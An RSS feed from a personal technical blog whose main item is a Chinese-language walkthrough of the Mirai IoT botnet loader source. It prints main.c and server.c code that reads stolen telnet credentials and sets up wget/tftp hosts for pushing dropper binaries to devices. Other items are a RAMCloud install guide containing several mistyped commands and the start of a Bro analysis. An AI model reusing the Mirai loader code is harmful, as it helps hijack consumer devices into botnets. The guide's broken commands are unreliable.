<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Network | Terry Tang</title><link>http://www.guozet.me/category/Network/</link><atom:link href="http://www.guozet.me/category/Network/index.xml" rel="self" type="application/rss+xml"/><description>Network</description><generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en</language><copyright>guozet.me © 2020</copyright><lastBuildDate>Mon, 29 Oct 2018 06:09:31 +0000</lastBuildDate><image><url>http://www.guozet.me/images/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png</url><title>Network</title><link>http://www.guozet.me/category/Network/</link></image><item><title>Mirai源代码分析1--Loader的工作过程</title><link>http://www.guozet.me/post/Mirai-loader-Code-Walking-thought/</link><pubDate>Mon, 29 Oct 2018 06:09:31 +0000</pubDate><guid>http://www.guozet.me/post/Mirai-loader-Code-Walking-thought/</guid><description>&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-29-Mirai-loader-Code-Walking-thought/2018-10-30-12-42-01.png" alt="">&lt;/p>
&lt;h1 id="前言">前言&lt;/h1>
&lt;blockquote>
&lt;p>The Mirai internet of things (IoT) botnet is infamous for targeting connected household consumer products. It attaches itself to cameras, alarm systems and personal routers, and spreads quickly. The damage can be quite substantial. People might not realize that their internet-enabled webcam was actually responsible for attacking Netflix. Cite:
&lt;a href="https://www.incapsula.com/blog/how-to-identify-a-mirai-style-ddos-attack.html" target="_blank" rel="noopener">How to Identify a Mirai-Style DDoS Attack&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>Mirai IoT 僵尸网络可以连接到家居的用户级的IoT设备，它可以将自己安装到摄像头，警报器以及个人的路由器里面，并且能够非常快的扩散出去，造成很大的破坏力。&lt;/p>
&lt;!-- more -->
&lt;hr>
&lt;h1 id="主要工作流程">主要工作流程&lt;/h1>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-29-Mirai-loader-Code-Walking-thought/2018-10-30-10-09-07.png" alt="">&lt;/p>
&lt;ul>
&lt;li>Preparing the Attack&lt;/li>
&lt;li>Deploying the Malware&lt;/li>
&lt;li>Repeating the Attack&lt;/li>
&lt;/ul>
&lt;p>在这一篇博客里，主要对&lt;code>Deploying the Malware&lt;/code>的流程的源代码进行详细的分析，希望能够在源代码阅读中，更加清晰地了解&lt;code>Mirai&lt;/code>的入侵流程。&lt;/p>
&lt;hr>
&lt;h1 id="部署malware的流程">部署Malware的流程&lt;/h1>
&lt;p>在这部分主要分析，Mirai Malware 是怎么部署到IoT设备上面的，也就是整个入侵的过程，这个过程是基于其他的&lt;code>Bot&lt;/code>已经发现了登录到这个系统的帐号之后。入侵过程分为下面三个部分：&lt;/p>
&lt;ul>
&lt;li>Scan success identified&lt;/li>
&lt;li>Loader receives data&lt;/li>
&lt;li>Loader pushes malware&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-29-Mirai-loader-Code-Walking-thought/2018-10-30-10-43-52.png" alt="">&lt;/p>
&lt;p>Malware 的源代码在 &lt;code>Master&lt;/code>端通过交叉编译的方式使其能够支持一系列的体系架构，在Mater端的&lt;code>Loader&lt;/code>代码试图确定即将感染的&lt;code>Bot&lt;/code>的硬件体系架构，然后再&lt;code>Push&lt;/code>最合适的可执行程序过去。然后，在可执行文件运行的情况下，该设备现在是僵尸网络的成员，并开始执行与僵尸网络中任何其他节点相同的扫描和攻击活动。&lt;/p>
&lt;p>&lt;strong>文件目录介绍&lt;/strong>：&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-10-29-Mirai-loader-Code-Walking-thought/2018-10-30-10-51-24.png" alt="">&lt;/p>
&lt;p>左上方显示的目录是&lt;code>Loader&lt;/code>根目录，里面包含了两个文件夹：&lt;code>bin&lt;/code>和&lt;code>src&lt;/code>，两个文件夹分别包含了：&lt;/p>
&lt;ul>
&lt;li>&lt;code>bin&lt;/code>文件夹： 包含了&lt;code>dlr.arm， dlr.arm7， dlr.m68k， dlr.mips， dlr.mpsl, dlr.ppc,dlr.sh4, dlr.spc, dlr.x86&lt;/code>不同体系架构上面的可执行代码.&lt;/li>
&lt;li>&lt;code>src&lt;/code>文件夹：
&lt;ul>
&lt;li>main.c Loader执行过程的核心程序&lt;/li>
&lt;li>connection.c&lt;/li>
&lt;li>server.c&lt;/li>
&lt;li>telnet_info.c&lt;/li>
&lt;li>util.c 工具文件, 提供给其他部分可以调用的四个函数工具&lt;/li>
&lt;li>server.c&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="源代码分析">源代码分析&lt;/h2>
&lt;p>首先对&lt;code>main&lt;/code>函数进行分析，因为整个文件不算太长，所以就将其源代码全部放在这里进行分析。&lt;/p>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;errno.h&amp;gt;
#include &amp;lt;pthread.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;quot;headers/binary.h&amp;quot;
#include &amp;quot;headers/includes.h&amp;quot;
#include &amp;quot;headers/server.h&amp;quot;
#include &amp;quot;headers/telnet_info.h&amp;quot;
#include &amp;quot;headers/util.h&amp;quot;
static void *stats_thread(void *);
static struct server *srv; //重要全局变量
char *id_tag = &amp;quot;telnet&amp;quot;;
int main(int argc, char **args) {
pthread_t stats_thrd;
uint8_t addrs_len;
ipv4_t *addrs;
uint32_t total = 0;
struct telnet_info info;
addrs_len = 2;
addrs = calloc(addrs_len, sizeof(ipv4_t));
addrs[0] = inet_addr(&amp;quot;192.168.0.1&amp;quot;); // Address to bind to
addrs[1] = inet_addr(&amp;quot;192.168.1.1&amp;quot;); // Address to bind to
if (argc == 2) {
id_tag = args[1];
}
if (!binary_init()) {
printf(&amp;quot;Failed to load bins/dlr.* as dropper\n&amp;quot;);
return 1;
}
if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,
1024 * 64, &amp;quot;100.200.100.100&amp;quot;, 80,
&amp;quot;100.200.100.100&amp;quot;)) == NULL) {
printf(&amp;quot;Failed to initialize server. Aborting\n&amp;quot;);
return 1;
}
pthread_create(&amp;amp;stats_thrd, NULL, stats_thread, NULL);
while (TRUE) {
char strbuf[1024];
if (fgets(strbuf, sizeof(strbuf), stdin) == NULL) break;
util_trim(strbuf);
if (strlen(strbuf) == 0) {
usleep(10000);
continue;
}
memset(&amp;amp;info, 0, sizeof(struct telnet_info));
if (telnet_info_parse(strbuf, &amp;amp;info) == NULL)
printf(
&amp;quot;Failed to parse telnet info: \&amp;quot;%s\&amp;quot; Format -&amp;gt; ip:port user:pass &amp;quot;
&amp;quot;arch\n&amp;quot;,
strbuf);
else {
if (srv == NULL) printf(&amp;quot;srv == NULL 2\n&amp;quot;);
server_queue_telnet(srv, &amp;amp;info);
if (total++ % 1000 == 0) sleep(1);
}
ATOMIC_INC(&amp;amp;srv-&amp;gt;total_input);
}
printf(&amp;quot;Hit end of input.\n&amp;quot;);
while (ATOMIC_GET(&amp;amp;srv-&amp;gt;curr_open) &amp;gt; 0) sleep(1);
return 0;
}
static void *stats_thread(void *arg) {
uint32_t seconds = 0;
while (TRUE) {
fflush(stdout);
sleep(1);
}
}
&lt;/code>&lt;/pre>
&lt;p>Main.c文件中有这样几个重要的结构体：&lt;/p>
&lt;ul>
&lt;li>static struct server *srv; 全局变量&lt;/li>
&lt;li>struct telnet_info info; 局部变量&lt;/li>
&lt;/ul>
&lt;p>几个重要的函数&lt;/p>
&lt;ul>
&lt;li>binary_init() 函数&lt;/li>
&lt;li>srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, &amp;ldquo;100.200.100.100&amp;rdquo;, 80,&amp;ldquo;100.200.100.100&amp;rdquo;)) == NULL) 里面的&lt;code>server_create&lt;/code>函数。&lt;/li>
&lt;li>最后循环里面的：telnet_info_parse(strbuf, &amp;amp;info) 与 server_queue_telnet(srv, &amp;amp;info)函数&lt;/li>
&lt;/ul>
&lt;h3 id="server_create-函数调用serverc">server_create 函数调用（Server.c）&lt;/h3>
&lt;p>在&lt;code>main.c&lt;/code>里面的main函数中调用了&lt;code>server_create&lt;/code>函数来创建了服务器用来支持&lt;code>sftp&lt;/code>和&lt;code>wget&lt;/code>协议。&lt;/p>
&lt;p>&lt;strong>main.c&lt;/strong>&lt;/p>
&lt;pre>&lt;code class="language-cpp">if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,
1024 * 64, &amp;quot;100.200.100.100&amp;quot;, 80,
&amp;quot;100.200.100.100&amp;quot;)) == NULL) {
printf(&amp;quot;Failed to initialize server. Aborting\n&amp;quot;);
return 1;
}
&lt;/code>&lt;/pre>
&lt;p>server.c&lt;/p>
&lt;pre>&lt;code class="language-cpp">struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs,
uint32_t max_open, char *wghip, port_t wghp,
char *thip) {
struct server *srv = calloc(1, sizeof(struct server));
struct server_worker *workers = calloc(threads, sizeof(struct server_worker));
int i;
srv-&amp;gt;bind_addrs_len = addr_len; // Default = 2
srv-&amp;gt;bind_addrs = addrs;
srv-&amp;gt;max_open = max_open; // 1024 * 64
srv-&amp;gt;wget_host_ip = wghip; // 100.200.100.100
srv-&amp;gt;wget_host_port = wghp; // 80
srv-&amp;gt;tftp_host_ip = thip; // 100.200.100.100
srv-&amp;gt;estab_conns = calloc(max_open * 2, sizeof(struct connection *));
srv-&amp;gt;workers = calloc(threads, sizeof(struct server_worker));
srv-&amp;gt;workers_len = threads;
if (srv-&amp;gt;estab_conns == NULL) {
printf(&amp;quot;Failed to allocate establisted_connections array.\n&amp;quot;);
exit(0);
}
for (i = 0; i &amp;lt; max_open * 2; i++) {
srv-&amp;gt;estab_conns[i] = calloc(1, sizeof(struct connection));
if (srv-&amp;gt;estab_conns[i] == NULL) {
printf(&amp;quot;Failed to allocate connection %d\n&amp;quot;, i);
exit(-1);
}
pthread_mutex_init(&amp;amp;(srv-&amp;gt;estab_conns[i]-&amp;gt;lock), NULL);
}
// Create worker threads
for (i = 0; i &amp;lt; threads; i++) //有多少个处理器
{
struct server_worker *wrker =
&amp;amp;srv-&amp;gt;workers[i]; //定义的指针只想src-&amp;gt;worker的地址
wrker-&amp;gt;srv = srv; //相互指定
wrker-&amp;gt;thread_id = i;
if ((wrker-&amp;gt;efd = epoll_create1(0)) == -1) {
printf(&amp;quot;Failed to initialize epoll context. Error code %d\n&amp;quot;, errno);
free(srv-&amp;gt;workers);
free(srv);
return NULL;
}
pthread_create(&amp;amp;wrker-&amp;gt;thread, NULL, worker, wrker);
}
pthread_create(&amp;amp;srv-&amp;gt;to_thrd, NULL, timeout_thread, srv);
return srv;
}
&lt;/code>&lt;/pre>
&lt;p>这个函数完成了服务器的配置，确定了服务器方的&lt;code>tftp&lt;/code>和&lt;code>wget&lt;/code>的服务提供方式，以及&lt;code>Port&lt;/code>的编号。&lt;/p>
&lt;hr>
&lt;h2 id="代码中的几个函数说明">代码中的几个函数说明&lt;/h2>
&lt;h4 id="sysconf函数">sysconf函数&lt;/h4>
&lt;p>
&lt;a href="http://man7.org/linux/man-pages/man3/sysconf.3.html" target="_blank" rel="noopener">sysconf函数&lt;/a>： Get configuration information at run time&lt;/p>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;unistd.h&amp;gt;
long sysconf(int name);
&lt;/code>&lt;/pre>
&lt;h4 id="pthread_mutex_init函数">pthread_mutex_init函数&lt;/h4>
&lt;p>pthread_mutex_init(&amp;amp;(srv-&amp;gt;estab_conns[i]-&amp;gt;lock), NULL);&lt;/p>
&lt;blockquote>
&lt;ul>
&lt;li>pthread_mutex_init(pthread_mutex_t * mutex,const pthread_mutexattr_t *attr); 初始化锁变量mutex。attr为锁属性，NULL值为默认属性。&lt;/li>
&lt;li>pthread_mutex_lock(pthread_mutex_t *mutex);加锁&lt;/li>
&lt;li>pthread_mutex_tylock(pthread_mutex_t *mutex);加锁，但是与2不一样的是当锁已经在使用的时候，返回为EBUSY，而不是挂起等待。&lt;/li>
&lt;li>pthread_mutex_unlock(pthread_mutex_t *mutex);释放锁&lt;/li>
&lt;li>pthread_mutex_destroy(pthread_mutex_t *mutex);使用完后释放&lt;/li>
&lt;/ul>
&lt;/blockquote>
&lt;h4 id="epoll函数">epoll函数&lt;/h4>
&lt;p>epoll 与 FreeBSD的kqueue类似，都向用户空间提供了自己的文件描述符来进行操作。&lt;/p>
&lt;p>&lt;code>int epoll_create(int size);&lt;/code>&lt;/p>
&lt;p>建一个epoll的句柄，size用来告诉内核需要监听的数目一共有多大。当创建好epoll句柄后，它就是会占用一个fd值，在linux下如果查看/proc/进程id/fd/，是能够看到这个fd的，所以在使用完epoll后，必须调用close() 关闭，否则可能导致fd被耗尽。&lt;/p>
&lt;p>&lt;code>int epoll_create1(int flag);&lt;/code>&lt;/p>
&lt;p>它和epoll_create差不多，不同的是epoll_create1函数的参数是flag，当flag是0时，表示和epoll_create函数完全一样，不需要size的提示了。&lt;/p>
&lt;p>当flag = EPOLL_CLOEXEC，创建的epfd会设置FD_CLOEXEC。&lt;/p>
&lt;p>当flag = EPOLL_NONBLOCK，创建的epfd会设置为非阻塞&lt;/p>
&lt;p>一般用法都是使用EPOLL_CLOEXEC.&lt;/p>
&lt;p>它是fd的一个标识说明，用来设置文件close-on-exec状态的。当close-on-exec状态为0时，调用exec时，fd不会被关闭；状态非零时则会被关闭，这样做可以防止fd泄露给执行exec后的进程。关于exec的用法，大家可以去自己查阅下，或者直接man exec。&lt;/p>
&lt;h4 id="pthread_create函数">pthread_create函数&lt;/h4>
&lt;pre>&lt;code class="language-cpp">#include &amp;lt;pthread.h&amp;gt;
int pthread_create(pthread_t *thread, const pthread_attr_t *attr,
void *(*start_routine) (void *), void *arg);
Compile and link with -pthread.
&lt;/code>&lt;/pre>
&lt;p>The pthread_create() function starts a new thread in the calling
process. The new thread starts execution by invoking
start_routine(); arg is passed as the sole argument of
start_routine().
　若成功则返回0，否则返回出错编号&lt;/p>
&lt;p>参数&lt;/p>
&lt;p>　　第一个参数为指向线程标识符的指针。&lt;/p>
&lt;p>　　第二个参数用来设置线程属性。&lt;/p>
&lt;p>　　第三个参数是线程运行函数的起始地址。&lt;/p>
&lt;p>最后一个参数是运行函数的参数。&lt;/p>
&lt;h4 id="去掉字符串前后的空格">去掉字符串前后的空格&lt;/h4>
&lt;pre>&lt;code class="language-cpp">// 用来处理前后空格的问题
char *util_trim(char *str)
{
char *end;
while(isspace(*str)) //处理前面的空格
str++;
if(*str == 0) //指向了 0 , 就是输入的地一个字符是 0 的话，那么就直接返回去这个 str
return str;
//strlen()用来计算指定的字符串s 的长度，不包括结束字符&amp;quot;\0&amp;quot;。
end = str + strlen(str) - 1; //判断结束位置---移动到最后一个 /0 之前
while(end &amp;gt; str &amp;amp;&amp;amp; isspace(*end)) //如果end位置大约str的擦汗你高度，并且end位置为空的话，那就移动回来
end--;
*(end+1) = 0; //给出结束位置
return str;
}
char strbuf[1024];
util_trim(strbuf);
&lt;/code>&lt;/pre>
&lt;h1 id="memset函数">memset函数&lt;/h1>
&lt;p>&lt;code>函数原型是：void *memset(void *s, int ch, size_t n);&lt;/code>&lt;/p>
&lt;p>函数功能是：将s所指向的某一块内存中的前n个字节的内容全部设置为ch指定的ASCII值， 第一个值为指定的内存地址，块的大小由第三个参数指定，这个函数通常为新申请的内存做初始化工作， 其返回值为指向s的指针，它是对较大的结构体或数组进行清零操作的一种最快方法。&lt;/p>
&lt;p>memset函数通常用来对一块已经分配地址的内存进行初始化，并且通常初始化为0或者字符&amp;rsquo;\0&amp;rsquo;（实际上是一样的）。&lt;/p>
&lt;h1 id="strtok-函数">strtok 函数&lt;/h1>
&lt;p>函数原型：char *strtok(char *s, char *delim);
函数功能：把字符串s按照字符串delim进行分割，然后返回分割的结果。&lt;/p>
&lt;p>1.strtok函数的实质上的处理是，strtok在s中查找包含在delim中的字符并用NULL(’\0′)来替换,直到找遍整个字符串。这句话有两层含义：（1）每次调用strtok函数只能获得一个分割单位。（2）要获得所有的分割单元必须反复调用strtok函数。&lt;/p>
&lt;p>2.strtok函数以后的调用时的需用NULL来替换s.&lt;/p>
&lt;p>3.形参s(要分割的字符串)对应的变量应用char s[]=”….”形式，而不能用char *s=”….”形式&lt;/p></description></item><item><title>How to install RAMcloud on Ubuntu16.04</title><link>http://www.guozet.me/post/How-to-install-RAMcloud-on-Ubuntu16-04/</link><pubDate>Sun, 15 Jul 2018 11:38:13 +0000</pubDate><guid>http://www.guozet.me/post/How-to-install-RAMcloud-on-Ubuntu16-04/</guid><description>&lt;h1 id="introduce">Introduce&lt;/h1>
&lt;p>
&lt;a href="https://github.com/PlatformLab/RAMCloud" target="_blank" rel="noopener">RAMCloud&lt;/a> is a new class of super-high-speed storage for large-scale datacenter applications. It is designed for applications in which a large number of servers in a datacenter need low-latency access to a large durable datastore. RAMCloud offers the following properties:&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-16-47-41.png" alt="">&lt;/p>
&lt;p>Project Link:
&lt;a href="https://ramcloud.atlassian.net/wiki/spaces/RAM/overview" target="_blank" rel="noopener">RAMCloud&lt;/a>&lt;/p>
&lt;p>Office Installing introduce:
&lt;a href="https://ramcloud.atlassian.net/wiki/spaces/RAM/pages/6848614/General&amp;#43;Information&amp;#43;for&amp;#43;Developers" target="_blank" rel="noopener">General Information for Developers&lt;/a>&lt;/p>
&lt;p>I have written the shell script to install the RAMCloud on Ubuntu 16.04 or Ubuntu18.04. If you want to build the RAMCloud as soon as possible, please fell free to use my repo on the github. Please read the README.md file in the repo and know how to use the scripts to help you.&lt;/p>
&lt;ul>
&lt;li>Github repo Link:
&lt;a href="https://github.com/guozetang/RAMCloud_Ubuntu16.04" target="_blank" rel="noopener">RAMCloud For Ubuntu16.04&lt;/a>&lt;/li>
&lt;li>Bitbucket repo Link:
&lt;a href="https://bitbucket.org/guozetang/ramcloud/src/master/" target="_blank" rel="noopener">RAMCloud For Ubuntu16.04&lt;/a>&lt;/li>
&lt;/ul>
&lt;p>If you have some issue with this script, please send
&lt;a href="guoze.work@gmail.com">email&lt;/a> to me. I will reply it as soon as possible. In addtion, please read the next introduce about how to install Ramcloud by command if you want to understand each step to install RAMCloud.&lt;/p>
&lt;hr>
&lt;h1 id="installing-ramcloud-on-ubuntu1604">Installing Ramcloud on Ubuntu16.04&lt;/h1>
&lt;h2 id="necessary-tools">Necessary Tools&lt;/h2>
&lt;ul>
&lt;li>GNU Make (Anything reasonably recent)&lt;/li>
&lt;li>GNU g++ (4.9.x)&lt;/li>
&lt;li>git (&amp;gt;= 1.6.0)&lt;/li>
&lt;li>Perl (Anything reasonably recent)
&lt;ul>
&lt;li>For mergedeps.pl, which automatically inserts included headers in source files into the make dependencies.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>Python 2.6, epydoc&lt;/li>
&lt;li>Boost
&lt;ul>
&lt;li>If you&amp;rsquo;re having issues with Boost on Ubuntu, check boost ticket #3844.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>pcre&lt;/li>
&lt;li>Doxygen 1.7.1&lt;/li>
&lt;li>protocol buffers
&lt;ul>
&lt;li>If you&amp;rsquo;re getting lots of undefined reference errors during linking, it&amp;rsquo;s likely that your libprotobuf is compiled with a different library ABI than RAMCloud. Check GCC&amp;rsquo;s Dual ABI page and the &amp;ldquo;GLIBCXX_USE_CXX11_ABI&amp;rdquo; flag in GNUMakefile.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>ZooKeeper&lt;/li>
&lt;li>java and javac (&amp;gt;= 1.7.0_25)&lt;/li>
&lt;/ul>
&lt;p>If your system is Ubuntu 15.04 or 14.04, then you can just use this command to install these packets in your system.&lt;/p>
&lt;pre>&lt;code class="language-bash">apt-get install build-essential git-core doxygen=1.7.1 libpcre3-dev protobuf-compiler libprotobuf-dev libcrypto++-dev libevent-dev libboost-all-dev libgtest-dev libzookeeper-mt-dev zookeeper libssl-dev
&lt;/code>&lt;/pre>
&lt;h2 id="analyze">Analyze&lt;/h2>
&lt;p>I can&amp;rsquo;t use this command to work on the Ubuntu 16.04. In addtion, I hope I can use the RAMCloud on any Ubuntu system. It means that it should be worked on Ubuntu 16.04 or 18.04. So I need to compile these packet by g++ or gcc or Cmake.&lt;/p>
&lt;hr>
&lt;h2 id="install-dependency">Install Dependency&lt;/h2>
&lt;h3 id="install-build-essential-libssl-dev-and-git">Install build-essential, libssl-dev and git&lt;/h3>
&lt;p>We can get these two libs on Ubuntu 16.06 or 18.04. So we just need to use &lt;code>apt-get&lt;/code> to get these lib.&lt;/p>
&lt;pre>&lt;code class="language-bash">sudo apt-get -y build-essential libssl-dev git
&lt;/code>&lt;/pre>
&lt;h3 id="install-gccg-49">Install gcc/g++ 4.9&lt;/h3>
&lt;p>The RAMCloud source code used some features in the C++11 Standard. As a result, we need to make sure the &lt;code>gcc/g++&lt;/code> version have support the &lt;code>C++11&lt;/code> Standard. Then we choose the &lt;code>gcc/g++ 4.9&lt;/code> to install. Please follow the commands.&lt;/p>
&lt;pre>&lt;code class="language-bash">sudo apt-get install -y software-properties-common
sudo add-apt-repositocry -y ppa:ubuntu-toolchain-r/test
sudo apt-get update
mv /usr/bin/gcc /usr/bin/gcc.bak
mv /usr/bin/g++ /usr/bin/g++.bak
sudo apt-get install -y gcc-4.9
sudo apt-get install -y g++-4.9
lnif /usr/bin/g++-4.9 /usr/bin/g++
lnif /usr/bin/gcc-4.9 /usr/bin/gcc
g++ -v
gcc -v
&lt;/code>&lt;/pre>
&lt;p>If the &lt;code>g++ -v&lt;/code> command can output the information like the followed graph. Then it means that you have installed the &lt;code>g++ 4.9&lt;/code> correctly.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-16-35-42.png" alt="">&lt;/p>
&lt;p>If the &lt;code>gcc -v&lt;/code> command can output the information like the followed graph. Then it means that you have installed the &lt;code>gcc 4.9&lt;/code> correctly.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-16-37-27.png" alt="">&lt;/p>
&lt;p>You must to make sure you have installed the &lt;code>gcc&lt;/code> and &lt;code>g++&lt;/code> correctly when you want to continue the next steps.&lt;/p>
&lt;h3 id="install-java-and-javac">Install Java and Javac&lt;/h3>
&lt;pre>&lt;code class="language-bash">sudo apt-add-repository -y ppa:webupd8team/java
sudo apt-get update
install_dependency oracle-java8-installer
java -version
&lt;/code>&lt;/pre>
&lt;p>If the &lt;code>java -version&lt;/code> command can output the information like the followed graph. Then it means that you have installed the &lt;code>java&lt;/code> correctly.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-16-40-29.png" alt="">&lt;/p>
&lt;h3 id="install-cmake">Install Cmake&lt;/h3>
&lt;p>We will use &lt;code>Cmake&lt;/code> to compile the &lt;code>Doxygen 1.7.2&lt;/code> in the next steps.&lt;/p>
&lt;pre>&lt;code class="language-bash">sudo apt-get install -y software-properties-common
sudo add-apt-repository -y ppa:george-edison55/cmake-3.x
sudo apt-get update
sudo apt-get install -y cmake
cmake --version
&lt;/code>&lt;/pre>
&lt;p>Use &lt;code>cmake --version&lt;/code> to check the version of cmake. If the &lt;code>cmake --version&lt;/code> command can output the informaton like the followed graph. Then it means that you have installed the &lt;code>cmake&lt;/code> correctly.&lt;/p>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-16-49-08.png" alt="">&lt;/p>
&lt;hr>
&lt;h3 id="download-the-packages-which-will-be-need-in-the-next-few-steps">Download the packages which will be need in the next few steps.&lt;/h3>
&lt;pre>&lt;code class="language-bash">git clone git@bitbucket.org:guozetang/ramcloud.git
cd ./ramcloud/packages/
&lt;/code>&lt;/pre>
&lt;p>When you get in to this director, you can find these packages in this director.
&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-20-16-41.png" alt="">&lt;/p>
&lt;p>We will use these packages in the next steps.&lt;/p>
&lt;h3 id="install-pcre">Install Pcre&lt;/h3>
&lt;pre>&lt;code class="language-bash">tar -xzvf pcre-8.42.tar.gz
cd pcre-8.42
./configure --prefix=/usr/local/pcre
make
sudo make install
sudo echo &amp;quot;/usr/local/pcre/lib/&amp;quot; &amp;gt; /etc/ld.so.conf.d/pcre.conf
&lt;/code>&lt;/pre>
&lt;h3 id="install-python26">Install Python2.6&lt;/h3>
&lt;pre>&lt;code class="language-bash">tar zxvf Python-2.6.6.tgz
cd Python-2.6.6
./configure --prefix=/usr/local/python2.6
make
sudo make install
sudo ln -s /usr/local/python2.6/bin/python2.6 /usr/bin/python2.6 -f
config_ld_lib /usr/local/python2.6/lib/ /etc/ld.so.conf.d/python2.6.conf
python2.6 --version
&lt;/code>&lt;/pre>
&lt;p>&lt;img src="http://www.guozet.me/images/in-post/2018-07-15-How-to-install-RAMcloud-on-Ubuntu16-04/2018-09-08-17-08-22.png" alt="">&lt;/p>
&lt;h3 id="install-boost">Install Boost&lt;/h3>
&lt;pre>&lt;code class="language-bash">tar -xvf boost_1_52_0.tar
cd boost_1_52_0
sudo ./bootstrap.sh
sudo ./b2 -j
sudo ./b2 install --prefix=/usr/local/boost_1_52_0
sudo echo &amp;quot;/usr/local/boost_1_52_0/lib/&amp;quot; &amp;gt; /etc/ld.so.conf.d/boost_1_52_0.conf
&lt;/code>&lt;/pre>
&lt;h3 id="install-doxygen172">Install Doxygen1.7.2&lt;/h3>
&lt;pre>&lt;code class="language-bash">tar -xzvf doxygen.tar.gz
cd doxygen
cd build
cmake -G &amp;quot;Unix Makefiles&amp;quot; ..
make
sudo make Install
&lt;/code>&lt;/pre>
&lt;h3 id="install-protocol-buffers">Install Protocol Buffers&lt;/h3>
&lt;pre>&lt;code class="language-bash">tar -xzvf protobuf-2.6.1.tar.gz
cd $CURRENT_DIR/packages/protobuf-2.6.1
./configure --prefix=/usr/local/protobuf
make
make check
sudo make install
sudo echo &amp;quot;/usr/local/protobuf/lib/&amp;quot; &amp;gt; /etc/ld.so.conf.d/protobuf.conf
sudo ln -s /usr/local/protobuf/bin/protoc /usr/bin/protoc -f
&lt;/code>&lt;/pre>
&lt;h3 id="install-zookeeper">Install Zookeeper&lt;/h3>
&lt;pre>&lt;code class="language-bash">tar -xzvf zookeeper-3.3.6.tar.gz
cd zookeeper-3.3.6/src/c
./configure --prefix=/usr/local/zookeeper
make
sudo make install
sudo echo &amp;quot;/usr/local/zookeeper/lib/&amp;quot; &amp;gt; /etc/ld.so.conf.d/zookeeper.conf
&lt;/code>&lt;/pre>
&lt;p>This last command &lt;code>sudo echo &amp;quot;/usr/local/zookeeper/lib/&amp;quot; &amp;gt; /etc/ld.so.conf.d/zookeeper.conf&lt;/code> can make the other application can find the &lt;code>zookeeper lib&lt;/code> in the system.&lt;/p>
&lt;h2 id="config-the-path">Config the Path&lt;/h2>
&lt;p>Add the &lt;code>include path&lt;/code>,&lt;code>library path&lt;/code> in the &lt;code>/etc/profile&lt;/code>.&lt;/p>
&lt;pre>&lt;code class="language-bash">export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/pcre/lib/:/usr/local/python2.6/lib/:/usr/local/boost_1_52_0/lib/:/usr/local/protobuf/lib/:/usr/local/zookeeper/lib/
export LIBRARY_PATH=$LIBRARY_PATH:/usr/local/pcre/lib/:/usr/local/python2.6/lib/:/usr/local/boost_1_52_0/lib/:/usr/local/protobuf/lib/:/usr/local/zookeeper/lib/
export C_INCLUDE_PATH=$C_INCLUDE_PATH:/usr/local/pcre/include/:/usr/local/python2.6/include/:/usr/local/boost_1_52_0/include/:/usr/local/protobuf/include/:/usr/local/zookeeper/include/c-client-src/
export CPLUS_INCLUDE_PATH=$CPLUS_INCLUDE_PATH:/usr/local/pcre/include/:/usr/local/python2.6/include/:/usr/local/boost_1_52_0/include/:/usr/local/protobuf/include/:/usr/local/zookeeper/include/c-client-src/
export PATH=$PATH:/usr/local/pcre/bin/:/usr/local/python2.6/bin/:/usr/local/protobuf/bin/:/usr/local/zookeeper/bin/
export PKG_CONFIG_PATH=:/usr/local/protobuf/lib/pkgconfig/
&lt;/code>&lt;/pre>
&lt;h2 id="install-ramcloud">Install RAMCloud&lt;/h2>
&lt;pre>&lt;code class="language-bash">git clone https://github.com/PlatformLab/RAMCloud.git
cd RAMCloud
make -j12 DEBUG=no
&lt;/code>&lt;/pre></description></item><item><title>Bro源代码分析---IP数据包处理流程</title><link>http://www.guozet.me/post/Bro-source-codes-walkthought/</link><pubDate>Sat, 09 Jun 2018 01:02:39 +0000</pubDate><guid>http://www.guozet.me/post/Bro-source-codes-walkthought/</guid><description>&lt;h1 id="前言">前言&lt;/h1>
&lt;p>Bro是一款非常优秀的网络协议分析器。Bro里面的Binpac解析器可以很方便的让我们使用Binpac语言书写协议解析器，并通过Binpac转换成C++语言，这在使用中能够很大程度的减少开发时间，也可以避免手写容易考虑不全的问题。但是在使用Binpac之前，我们需要去了解Bro在处理网络数据包的时候的处理流程，能够方便我们在Binpac使用中去掉和Bro耦合的部分，生成我们需要的协议解析器的C++文件。&lt;/p>
